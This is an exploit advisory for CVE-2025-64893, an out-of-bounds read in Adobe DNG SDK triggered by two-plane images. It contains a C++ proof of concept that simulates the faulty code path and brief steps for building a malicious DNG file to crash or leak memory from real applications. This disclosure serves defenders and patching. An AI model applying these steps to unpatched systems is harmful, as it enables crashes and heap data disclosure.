@@ -1,0 +1,318 @@
+=============================================================================================================================================
+| # Title     : Adobe DNG SDK prior to v1.7.1.2410 Out-of-Bounds Read Due to Missing fSrcPlanes=2 Validation                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://helpx.adobe.com/security/products/dng-sdk.html                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213066/ &	CVE-2025-64893
+
+[+] Summary    : An out-of-bounds read vulnerability exists in Adobe DNG SDK versions prior to 1.7.1.2410 due to improper handling of raw images containing exactly two color planes (fSrcPlanes = 2).
+                 The flaw occurs during image rendering when the SDK assumes a four-plane layout and reads memory beyond the allocated heap buffer.
+
+[+] Root Cause :
+
+In dng_render_task::ProcessArea(), the SDK correctly handles images with 1, 3, or 4 color planes
+but fails to validate the uncommon case where fSrcPlanes equals 2.
+
+When this condition occurs, execution incorrectly enters the four-plane processing path and
+invokes DoBaselineABCDtoRGB(), which unconditionally reads from four source plane pointers
+(sPtrA through sPtrD). Since only two planes are actually allocated, the remaining pointers
+reference memory outside the valid heap buffer, resulting in out-of-bounds reads.
+
+[+] Impact :
+
+    - Out-of-bounds heap memory read (information disclosure)
+    - Application crash (denial of service)
+    - Potential exploitation when chained with other memory corruption primitives
+
+[+] Attack Vector :
+
+A specially crafted DNG file containing a ColorMatrix tag with exactly six values forces
+fColorPlanes to be set to 2. When such a file is processed (e.g., via dng_validate or any
+application using the vulnerable DNG SDK), the invalid plane handling logic is triggered.
+
+[+] Fix :
+
+Adobe addressed this issue in DNG SDK version 1.7.1.2410, released on November 17, 2025.
+Users are strongly advised to update immediately.
+
+[+] POC :
+
+#include <iostream>
+#include <cstdint>
+#include <cstdlib>
+#include <cstring>
+
+// ============================================
+// SIMULATION OF VULNERABLE DNG SDK CODE
+// ============================================
+
+// Simplified pixel buffer structure
+struct DngPixelBuffer {
+    uint8_t* data;           // Raw pixel data
+    int32_t plane_step;      // Offset between color planes (in floats)
+    int32_t row_step;        // Offset between rows
+    int32_t col_step;        // Offset between columns (usually 1)
+    
+    // Constructor
+    DngPixelBuffer(uint8_t* buffer, int32_t p_step, int32_t r_step, int32_t c_step)
+        : data(buffer), plane_step(p_step), row_step(r_step), col_step(c_step) {}
+};
+
+// Simulated color conversion function (vulnerable version)
+void DoBaselineABCDtoRGB(const float* planeA,
+                         const float* planeB,
+                         const float* planeC,
+                         const float* planeD,
+                         float* outputR,
+                         float* outputG,
+                         float* outputB,
+                         uint32_t width,
+                         const float* white_balance,
+                         const float* color_matrix) {
+    
+    std::cout << "[DEBUG] Processing " << width << " pixels with 4 planes assumption\n";
+    
+    // VULNERABLE: Accesses all 4 planes even when only 2 exist
+    for (uint32_t col = 0; col < width; col++) {
+        float a = planeA[col];
+        float b = planeB[col];
+        float c = planeC[col];  // OUT-OF-BOUNDS READ when fSrcPlanes=2!
+        float d = planeD[col];  // OUT-OF-BOUNDS READ when fSrcPlanes=2!
+        
+        // Simulate color conversion (simplified)
+        outputR[col] = a * 1.2f + c * 0.1f;  // Uses illegal 'c'
+        outputG[col] = b * 0.9f + d * 0.3f;  // Uses illegal 'd'
+        outputB[col] = a * 0.8f + b * 0.7f;
+        
+        // Debug output for first few pixels
+        if (col < 3) {
+            std::cout << "  Pixel " << col << ": A=" << a << " B=" << b 
+                     << " C=" << c << " D=" << d << "\n";
+        }
+    }
+}
+
+// Simulated vulnerable ProcessArea function
+void VulnerableProcessArea(DngPixelBuffer* src_buffer,
+                          int32_t src_row,
+                          int32_t src_cols,
+                          int32_t src_planes) {
+    
+    std::cout << "[DEBUG] ProcessArea called with src_planes=" << src_planes 
+              << ", src_cols=" << src_cols << "\n";
+    
+    // Get pointer to first plane
+    const float* ptrA = reinterpret_cast<const float*>(
+        src_buffer->data + src_row * src_buffer->row_step);
+    
+    // Allocate output buffers
+    float* outputR = new float[src_cols];
+    float* outputG = new float[src_cols];
+    float* outputB = new float[src_cols];
+    
+    if (src_planes == 1) {
+        std::cout << "[INFO] Processing 1 plane (monochrome)\n";
+        // Safe: copy single plane to all three outputs
+        for (int32_t i = 0; i < src_cols; i++) {
+            outputR[i] = ptrA[i];
+            outputG[i] = ptrA[i];
+            outputB[i] = ptrA[i];
+        }
+    }
+    else if (src_planes == 3) {
+        std::cout << "[INFO] Processing 3 planes (normal RGB)\n";
+        // Safe: three planes available
+        const float* ptrB = ptrA + src_buffer->plane_step;
+        const float* ptrC = ptrB + src_buffer->plane_step;
+        
+        for (int32_t i = 0; i < src_cols; i++) {
+            outputR[i] = ptrA[i] * 1.1f;
+            outputG[i] = ptrB[i] * 1.0f;
+            outputB[i] = ptrC[i] * 0.9f;
+        }
+    }
+    else {
+        // VULNERABLE: Assumes src_planes == 4
+        // But can be src_planes == 2!
+        std::cout << "[WARNING] Entering 4-plane processing path\n";
+        
+        const float* ptrB = ptrA + src_buffer->plane_step;
+        const float* ptrC = ptrB + src_buffer->plane_step;  // PROBLEM: May be OOB!
+        const float* ptrD = ptrC + src_buffer->plane_step;  // PROBLEM: Definitely OOB!
+        
+        // Print memory addresses to show the issue
+        std::cout << "[DEBUG] Memory pointers:\n";
+        std::cout << "  Plane A: " << (void*)ptrA << "\n";
+        std::cout << "  Plane B: " << (void*)ptrB << "\n";
+        std::cout << "  Plane C: " << (void*)ptrC << "\n";
+        std::cout << "  Plane D: " << (void*)ptrD << "\n";
+        
+        // This will read out-of-bounds when src_planes=2
+        DoBaselineABCDtoRGB(ptrA, ptrB, ptrC, ptrD,
+                           outputR, outputG, outputB,
+                           src_cols,
+                           nullptr, nullptr);
+    }
+    
+    // Print some output values
+    std::cout << "[DEBUG] First 3 output pixels:\n";
+    for (int i = 0; i < 3 && i < src_cols; i++) {
+        std::cout << "  Pixel " << i << ": R=" << outputR[i] 
+                 << " G=" << outputG[i] << " B=" << outputB[i] << "\n";
+    }
+    
+    // Cleanup
+    delete[] outputR;
+    delete[] outputG;
+    delete[] outputB;
+}
+
+// ============================================
+// EXPLOIT DEMONSTRATION
+// ============================================
+
+int main() {
+    std::cout << "========================================\n";
+    std::cout << "DNG SDK CVE-2025-64893 EXPLOIT DEMO\n";
+    std::cout << "Heap Buffer Overflow Vulnerability\n";
+    std::cout << "          By indoushka             \n";
+    std::cout << "========================================\n\n";
+    
+    // Configuration
+    const int32_t IMAGE_WIDTH = 10;
+    const int32_t IMAGE_HEIGHT = 1;
+    const int32_t PLANE_COUNT = 2;  // This triggers the vulnerability!
+    const int32_t PLANE_STEP = IMAGE_WIDTH;  // Each plane is width floats
+    
+    // Calculate buffer size
+    const size_t BUFFER_SIZE = PLANE_COUNT * PLANE_STEP * sizeof(float);
+    
+    std::cout << "[CONFIG] Creating image with:\n";
+    std::cout << "  Width: " << IMAGE_WIDTH << " pixels\n";
+    std::cout << "  Height: " << IMAGE_HEIGHT << " rows\n";
+    std::cout << "  Planes: " << PLANE_COUNT << " (THIS TRIGGERS THE BUG!)\n";
+    std::cout << "  Plane step: " << PLANE_STEP << " floats\n";
+    std::cout << "  Buffer size: " << BUFFER_SIZE << " bytes\n\n";
+    
+    // Allocate and initialize buffer
+    uint8_t* pixel_data = new uint8_t[BUFFER_SIZE];
+    float* float_data = reinterpret_cast<float*>(pixel_data);
+    
+    std::cout << "[INIT] Initializing pixel data...\n";
+    
+    // Fill plane A (first plane)
+    for (int i = 0; i < IMAGE_WIDTH; i++) {
+        float_data[i] = static_cast<float>(i);  // Plane A values: 0, 1, 2, ...
+    }
+    
+    // Fill plane B (second plane)
+    for (int i = 0; i < IMAGE_WIDTH; i++) {
+        float_data[PLANE_STEP + i] = static_cast<float>(i + 100);  // 100, 101, 102, ...
+    }
+    
+    // Create pixel buffer
+    DngPixelBuffer buffer(pixel_data, 
+                         PLANE_STEP,  // plane_step in floats
+                         IMAGE_WIDTH * PLANE_COUNT * sizeof(float),  // row_step in bytes
+                         1);  // col_step
+    
+    std::cout << "\n[EXECUTION] Calling VulnerableProcessArea...\n";
+    std::cout << "----------------------------------------\n";
+    
+    // Trigger the vulnerability!
+    // This will process a 2-plane image but use 4-plane logic
+    VulnerableProcessArea(&buffer, 0, IMAGE_WIDTH, PLANE_COUNT);
+    
+    std::cout << "----------------------------------------\n";
+    
+    // Show what happens in memory
+    std::cout << "\n[MEMORY ANALYSIS]\n";
+    std::cout << "Valid buffer range: " << (void*)pixel_data 
+              << " to " << (void*)(pixel_data + BUFFER_SIZE) << "\n";
+    
+    // Calculate where ptrC and ptrD point to
+    const float* ptrA = reinterpret_cast<const float*>(pixel_data);
+    const float* ptrC = ptrA + 2 * PLANE_STEP;  // 2 planes ahead
+    const float* ptrD = ptrA + 3 * PLANE_STEP;  // 3 planes ahead
+    
+    std::cout << "ptrC points to: " << (void*)ptrC << "\n";
+    std::cout << "ptrD points to: " << (void*)ptrD << "\n";
+    
+    // Check if pointers are out of bounds
+    if (reinterpret_cast<const uint8_t*>(ptrC) >= pixel_data + BUFFER_SIZE) {
+        std::cout << "  -> ptrC is OUT OF BOUNDS!\n";
+    }
+    if (reinterpret_cast<const uint8_t*>(ptrD) >= pixel_data + BUFFER_SIZE) {
+        std::cout << "  -> ptrD is OUT OF BOUNDS!\n";
+    }
+    
+    // Demonstrate potential information leak
+    std::cout << "\n[INFORMATION LEAK DEMO]\n";
+    std::cout << "What ptrC might read (uninitialized memory after buffer):\n";
+    std::cout << "  First value at ptrC: " << *ptrC << "\n";
+    std::cout << "  This could contain sensitive data from heap!\n";
+    
+    // Cleanup
+    delete[] pixel_data;
+    
+    std::cout << "\n[RESULT]\n";
+    std::cout << "The program successfully demonstrated:\n";
+    std::cout << "1. Out-of-bounds memory reads\n";
+    std::cout << "2. Potential information disclosure\n";
+    std::cout << "3. In real DNG SDK, this could lead to:\n";
+    std::cout << "   - Application crash\n";
+    std::cout << "   - Information leak\n";
+    std::cout << "   - Possible code execution\n";
+    
+    return 0;
+}
+
+// ============================================
+// COMPILATION AND USAGE INSTRUCTIONS
+// ============================================
+
+/*
+HOW TO COMPILE AND RUN:
+
+1. Save the code to a file: dng_exploit_demo.cpp
+
+2. Compile with g++:
+   g++ -o dng_exploit_demo dng_exploit_demo.cpp -std=c++11
+
+3. Run the program:
+   ./dng_exploit_demo
+
+EXPECTED OUTPUT:
+- The program will simulate processing a 2-plane DNG image
+- It will show the vulnerable code path being taken
+- Memory addresses will demonstrate out-of-bounds access
+- Information about potential data leak will be shown
+
+REAL-WORLD EXPLOITATION:
+
+To exploit the actual DNG SDK vulnerability:
+
+1. Create a malicious DNG file:
+   - Set ColorMatrix tag with exactly 6 values (forces fColorPlanes=2)
+   - Include image data with only 2 color planes
+
+2. Trigger processing:
+   - Use dng_validate or any application using vulnerable DNG SDK
+   - Command: dng_validate -tif output.tif malicious.dng
+
+3. Potential impacts:
+   - Read sensitive data from heap memory
+   - Cause denial of service (crash)
+   - With careful heap grooming, possible code execution
+
+MITIGATION:
+- Update to DNG SDK version 1.7.1.2410 or later
+- Add proper validation for fSrcPlanes=2 case
+- Validate bounds before accessing plane pointers
+*/
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
